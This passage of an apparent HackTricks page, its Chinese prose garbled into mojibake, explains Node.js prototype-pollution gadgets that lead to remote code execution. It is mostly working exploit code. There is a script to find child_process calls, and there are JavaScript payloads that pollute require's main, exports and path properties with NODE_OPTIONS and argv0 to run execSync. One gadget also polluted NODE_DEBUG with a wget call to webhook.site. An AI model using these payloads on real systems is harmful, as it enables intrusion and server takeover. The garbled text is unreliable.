<li>åœ¨ä¸‹é¢<strong>æ‰¾åˆ°æ›´å¤šæ–‡ä»¶</strong></li>
</ul>
<p>ä»¥ä¸‹ç®€å•è„šæœ¬å°†æœç´¢<strong>æ¥è‡ª</strong>child_process<strong>çš„è°ƒç”¨</strong>ï¼Œ<strong>æ²¡æœ‰ä»»ä½•å¡«å……</strong>ï¼ˆä»¥é¿å…æ˜¾ç¤ºå‡½æ•°å†…éƒ¨çš„è°ƒç”¨ï¼‰ï¼š</p>
<p>{% code overflow="wrap" %}</p>
<pre><code class="language-bash">find / -name "*.js" -type f -exec grep -l "child_process" {} \; 2&gt;/dev/null | while read file_path; do
grep --with-filename -nE "^[a-zA-Z].*(exec\(|execFile\(|fork\(|spawn\(|execFileSync\(|execSync\(|spawnSync\()" "$file_path" | grep -v "require(" | grep -v "function " | grep -v "util.deprecate" | sed -E 's/.{255,}.*//'
done
# Note that this way of finding child_process executions just importing might not find valid scripts as functions called in the root containing child_process calls won't be found.
</code></pre>
<p>{% endcode %}</p>
<details>
<summary>ä¹‹å‰è„šæœ¬å‘ç°çš„æœ‰è¶£æ–‡ä»¶</summary>
<ul>
<li>node_modules/buffer/bin/<strong>download-node-tests.js</strong>:17:<code>cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })</code></li>
<li>node_modules/buffer/bin/<strong>test.js</strong>:10:<code>var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })</code></li>
<li>node_modules/npm/scripts/<strong>changelog.js</strong>:16:<code>const log = execSync(git log --reverse --pretty='format:%h %H%d %s (%aN)%n%b%n---%n' ${branch}...).toString().split(/\n/)</code></li>
<li>node_modules/detect-libc/bin/<strong>detect-libc.js</strong>:18:<code>process.exit(spawnSync(process.argv[2], process.argv.slice(3), spawnOptions).status);</code></li>
<li>node_modules/jest-expo/bin/<strong>jest.js</strong>:26:<code>const result = childProcess.spawnSync('node', jestWithArgs, { stdio: 'inherit' });</code></li>
<li>node_modules/buffer/bin/<strong>download-node-tests.js</strong>:17:<code>cp.execSync('rm -rf node/*.js', { cwd: path.join(__dirname, '../test') })</code></li>
<li>node_modules/buffer/bin/<strong>test.js</strong>:10:<code>var node = cp.spawn('npm', ['run', 'test-node'], { stdio: 'inherit' })</code></li>
<li>node_modules/runtypes/scripts/<strong>format.js</strong>:13:<code>const npmBinPath = execSync('npm bin').toString().trim();</code></li>
<li>node_modules/node-pty/scripts/<strong>publish.js</strong>:31:<code>const result = cp.spawn('npm', args, { stdio: 'inherit' });</code></li>
</ul>
</details>
<h3 id="é€šè¿‡åŸå‹æ±¡æŸ“è®¾ç½®-require-æ–‡ä»¶è·¯å¾„"><a class="header" href="#é€šè¿‡åŸå‹æ±¡æŸ“è®¾ç½®-require-æ–‡ä»¶è·¯å¾„">é€šè¿‡åŸå‹æ±¡æŸ“è®¾ç½® require æ–‡ä»¶è·¯å¾„</a></h3>
<p>{% hint style="warning" %}
<strong>ä¹‹å‰çš„æŠ€æœ¯è¦æ±‚</strong> <strong>ç”¨æˆ·æ§åˆ¶å°†è¦è¢« require çš„æ–‡ä»¶è·¯å¾„</strong>ã€‚ä½†è¿™å¹¶ä¸æ€»æ˜¯æ­£ç¡®çš„ã€‚
{% endhint %}</p>
<p>ç„¶è€Œï¼Œå¦‚æœä»£ç åœ¨åŸå‹æ±¡æŸ“åæ‰§è¡Œ requireï¼Œå³ä½¿ä½ <strong>ä¸æ§åˆ¶å°†è¦è¢« require çš„è·¯å¾„</strong>ï¼Œä½ <strong>å¯ä»¥é€šè¿‡æ»¥ç”¨åŸå‹æ±¡æŸ“å¼ºåˆ¶ä½¿ç”¨ä¸åŒçš„è·¯å¾„</strong>ã€‚å› æ­¤ï¼Œå³ä½¿ä»£ç è¡Œæ˜¯ <code>require("./a_file.js")</code> æˆ– <code>require("bytes")</code>ï¼Œå®ƒå°†<strong>requireä½ æ±¡æŸ“çš„åŒ…</strong>ã€‚</p>
<p>å› æ­¤ï¼Œå¦‚æœåœ¨ä½ çš„åŸå‹æ±¡æŸ“åæ‰§è¡Œäº† requireï¼Œå¹¶ä¸”æ²¡æœ‰ spawn å‡½æ•°ï¼Œè¿™å°±æ˜¯æ”»å‡»ï¼š</p>
<ul>
<li>æ‰¾åˆ°ä¸€ä¸ª<strong>ç³»ç»Ÿå†…çš„ <code>.js</code> æ–‡ä»¶</strong>ï¼Œå½“è¢«<strong>require</strong>æ—¶å°†<strong>ä½¿ç”¨ <code>child_process</code> æ‰§è¡ŒæŸäº›æ“ä½œ</strong></li>
<li>å¦‚æœä½ å¯ä»¥å‘ä½ æ”»å‡»çš„å¹³å°ä¸Šä¼ æ–‡ä»¶ï¼Œä½ å¯ä»¥ä¸Šä¼ è¿™æ ·çš„æ–‡ä»¶</li>
<li>æ±¡æŸ“è·¯å¾„ä»¥<strong>å¼ºåˆ¶ require åŠ è½½å°†ä½¿ç”¨ child_process æ‰§è¡ŒæŸäº›æ“ä½œçš„ <code>.js</code> æ–‡ä»¶</strong></li>
<li><strong>æ±¡æŸ“ç¯å¢ƒ/å‘½ä»¤è¡Œ</strong>ä»¥åœ¨è°ƒç”¨ child_process æ‰§è¡Œå‡½æ•°æ—¶æ‰§è¡Œä»»æ„ä»£ç ï¼ˆå‚è§åˆå§‹æŠ€æœ¯ï¼‰</li>
</ul>
<h4 id="ç»å¯¹-require"><a class="header" href="#ç»å¯¹-require">ç»å¯¹ require</a></h4>
<p>å¦‚æœæ‰§è¡Œçš„ require æ˜¯<strong>ç»å¯¹çš„</strong>ï¼ˆ<code>require("bytes")</code>ï¼‰ï¼Œå¹¶ä¸”<strong>åŒ…åœ¨ <code>package.json</code> æ–‡ä»¶ä¸­ä¸åŒ…å« main</strong>ï¼Œä½ å¯ä»¥<strong>æ±¡æŸ“ <code>main</code> å±æ€§</strong>å¹¶ä½¿<strong>require æ‰§è¡Œä¸åŒçš„æ–‡ä»¶</strong>ã€‚</p>
<p>{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Install package bytes (it doesn't have a main in package.json)
// npm install bytes

// Manual Pollution
b = {}
b.__proto__.main = "/tmp/malicious.js"

// Trigger gadget
var proc = require('bytes');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"main": "/tmp/malicious.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_absolute\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('bytes');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}
{% endtab %}</p>
<p>{% tab title="æ¶æ„.js" %}</p>
<pre><code class="language-javascript">const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork("anything");
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h4 id="ç›¸å¯¹-require---1"><a class="header" href="#ç›¸å¯¹-require---1">ç›¸å¯¹ require - 1</a></h4>
<p>å¦‚æœåŠ è½½çš„æ˜¯<strong>ç›¸å¯¹è·¯å¾„</strong>è€Œä¸æ˜¯ç»å¯¹è·¯å¾„ï¼Œæ‚¨å¯ä»¥ä½¿ node <strong>åŠ è½½ä¸åŒçš„è·¯å¾„</strong>ï¼š</p>
<p>{% tabs %}
{% tab title="exploit" %}
{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.exports = { ".": "./malicious.js" }
b.__proto__["1"] = "/tmp"

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"exports": {".": "./malicious.js"}, "1": "/tmp", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_1\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}
{% endtab %}</p>
<p>{% tab title="æ¶æ„.js" %}</p>
<pre><code class="language-javascript">const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h4 id="ç›¸å¯¹-require---2"><a class="header" href="#ç›¸å¯¹-require---2">ç›¸å¯¹ require - 2</a></h4>
<p>{% tabs %}
{% tab title="åˆ©ç”¨" %}
{% code overflow="wrap" %}</p>
<pre><code class="language-javascript">// Create a file called malicious.js in /tmp
// Contents of malicious.js in the other tab

// Manual Pollution
b = {}
b.__proto__.data = {}
b.__proto__.data.exports = { ".": "./malicious.js" }
b.__proto__.path = "/tmp"
b.__proto__.name = "./relative_path.js" //This needs to be the relative path that will be imported in the require

// Trigger gadget
var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js
// The relative path doesn't even need to exist


// Abusing the vulnerable code
USERINPUT = JSON.parse('{"__proto__": {"data": {"exports": {".": "./malicious.js"}}, "path": "/tmp", "name": "./relative_path.js", "NODE_OPTIONS": "--require /proc/self/cmdline", "argv0": "console.log(require(\\\"child_process\\\").execSync(\\\"touch /tmp/pp2rce_exports_path\\\").toString())//"}}')

clone(USERINPUT);

var proc = require('./relative_path.js');
// This should execute the file /tmp/malicious.js wich create the file /tmp/pp2rec
</code></pre>
<p>{% endcode %}
{% endtab %}</p>
<p>{% tab title="malicious.js" %}</p>
<pre><code class="language-javascript">const { fork } = require('child_process');
console.log("Hellooo from malicious");
fork('/path/to/anything');
</code></pre>
<p>{% endtab %}
{% endtabs %}</p>
<h4 id="ç›¸å¯¹-require---3"><a class="header" href="#ç›¸å¯¹-require---3">ç›¸å¯¹ require - 3</a></h4>
<p>ç±»ä¼¼äºå‰ä¸€ä¸ªï¼Œè¿™åœ¨ <a href="https://blog.huli.tw/2022/12/26/en/ctf-2022-web-js-summary/#balsn-ctf-2022-2linenodejs"><strong>è¿™ç¯‡æ–‡ç« </strong></a> ä¸­å‘ç°ã€‚</p>
<pre><code class="language-javascript">// Requiring /opt/yarn-v1.22.19/preinstall.js
Object.prototype["data"] = {
exports: {
".": "./preinstall.js"
},
name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
"NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
"NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
</code></pre>
<h2 id="vm-gadgets"><a class="header" href="#vm-gadgets">VM Gadgets</a></h2>
<p>åœ¨è®ºæ–‡ <a href="https://arxiv.org/pdf/2207.11171.pdf">https://arxiv.org/pdf/2207.11171.pdf</a> ä¸­ä¹ŸæŒ‡å‡ºï¼Œ<strong><code>vm</code></strong> åº“æŸäº›æ–¹æ³•çš„ <strong><code>contextExtensions</code></strong> æ§åˆ¶å¯ä»¥ä½œä¸ºä¸€ä¸ª gadgetã€‚<br />
ç„¶è€Œï¼Œä¸ä¹‹å‰çš„ <strong><code>child_process</code></strong> æ–¹æ³•ä¸€æ ·ï¼Œå®ƒåœ¨æœ€æ–°ç‰ˆæœ¬ä¸­å·²è¢« <strong>ä¿®å¤</strong>ã€‚</p>
<h2 id="fixes--unexpected-protections"><a class="header" href="#fixes--unexpected-protections">Fixes &amp; Unexpected protections</a></h2>
<p>è¯·æ³¨æ„ï¼ŒåŸå‹æ±¡æŸ“åœ¨è®¿é—®çš„å¯¹è±¡çš„ <strong>attribute</strong> ä¸º <strong>undefined</strong> æ—¶æœ‰æ•ˆã€‚å¦‚æœåœ¨ <strong>code</strong> ä¸­è¯¥ <strong>attribute</strong> è¢« <strong>è®¾ç½®</strong> ä¸º <strong>value</strong>ï¼Œä½  <strong>å°†æ— æ³•è¦†ç›–å®ƒ</strong>ã€‚</p>
<p>åœ¨ 2022 å¹´ 6 æœˆï¼Œä» <a href="https://github.com/nodejs/node/commit/20b0df1d1eba957ea30ba618528debbe02a97c6a"><strong>this commit</strong></a> å¼€å§‹ï¼Œå˜é‡ <code>options</code> ä¸å†æ˜¯ <code>{}</code>ï¼Œè€Œæ˜¯ <strong><code>kEmptyObject</code></strong>ã€‚è¿™ <strong>é˜²æ­¢äº†åŸå‹æ±¡æŸ“</strong> å½±å“ <strong><code>options</code></strong> çš„ <strong>attributes</strong> ä»¥è·å¾— RCEã€‚<br />
è‡³å°‘ä» v18.4.0 å¼€å§‹ï¼Œè¿™ç§ä¿æŠ¤å·²è¢« <strong>å®æ–½</strong>ï¼Œå› æ­¤ <code>spawn</code> å’Œ <code>spawnSync</code> çš„ <strong>exploits</strong> ä¸å†å½±å“è¿™äº›æ–¹æ³•ï¼ˆå¦‚æœä¸ä½¿ç”¨ <code>options</code>ï¼ï¼‰ã€‚</p>
<p>åœ¨ <a href="https://github.com/nodejs/node/commit/0313102aaabb49f78156cadc1b3492eac3941dd9"><strong>this commit</strong></a> ä¸­ï¼Œvm åº“çš„ <strong><code>contextExtensions</code></strong> çš„ <strong>prototype pollution</strong> ä¹Ÿé€šè¿‡å°†é€‰é¡¹è®¾ç½®ä¸º <strong><code>kEmptyObject</code></strong> è€Œ <strong>æŸç§ç¨‹åº¦ä¸Šä¿®å¤</strong>ã€‚</p>
<h3 id="other-gadgets"><a class="header" href="#other-gadgets"><strong>Other Gadgets</strong></a></h3>
<ul>
<li><a href="https://github.com/yuske/server-side-prototype-pollution">https://github.com/yuske/server-side-prototype-pollution</a></li>
<li><a href="https://github.com/KTH-LangSec/server-side-prototype-pollution">https://github.com/KTH-LangSec/server-side-prototype-pollution</a></li>
</ul>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/</a></li>
<li><a href="https://blog.sonarsource.com/blitzjs-prototype-pollution/">https://blog.sonarsource.com/blitzjs-prototype-pollution/</a></li>
<li><a href="https://arxiv.org/pdf/2207.11171.pdf">https://arxiv.org/pdf/2207.11171.pdf</a></li>
<li><a href="https://portswigger.net/research/server-side-prototype-pollution">https://portswigger.net/research/server-side-prototype-pollution</a></li>
</ul>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../../pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../../pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../../pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../../elasticlunr.min.js"></script>
        <script src="../../../mark.min.js"></script>
        <script src="../../../searcher.js"></script>

        <script src="../../../clipboard.min.js"></script>
        <script src="../../../highlight.js"></script>
        <script src="../../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
